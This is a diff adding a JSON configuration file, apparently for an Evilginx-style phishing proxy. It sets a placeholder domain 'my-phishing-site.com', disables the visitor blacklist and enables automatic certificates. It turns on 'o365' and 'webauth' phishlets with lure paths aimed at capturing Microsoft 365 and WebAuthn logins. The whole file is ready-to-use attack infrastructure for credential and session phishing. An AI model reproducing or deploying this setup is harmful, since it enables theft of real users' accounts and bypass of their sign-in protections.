@@ -1,0 +1,61 @@
+{
+  "blacklist": {
+    "mode": "off"
+  },
+  "general": {
+    "domain": "my-phishing-site.com",
+    "ipv4": "",
+    "external_ipv4": "0.0.0.0",
+    "bind_ipv4": "0.0.0.0",
+    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    "https_port": 443,
+    "dns_port": 53,
+    "autocert": true
+  },
+  "phishlets": {
+    "o365": {
+      "hostname": "my-phishing-site.com",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "webauth": {
+      "hostname": "my-phishing-site.com",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    }
+  },
+  "lures": [
+    {
+      "id": "",
+      "hostname": "",
+      "path": "/DZwkbKWF",
+      "redirect_url": "",
+      "phishlet": "o365",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    },
+     {
+      "id": "",
+      "hostname": "",
+      "path": "/webauthn",
+      "redirect_url": "",
+      "phishlet": "webauth",
+      "redirector": "",
+      "ua_filter": "",
+      "info": "",
+      "og_title": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_url": "",
+      "paused": 0
+    }
+  ]
+}
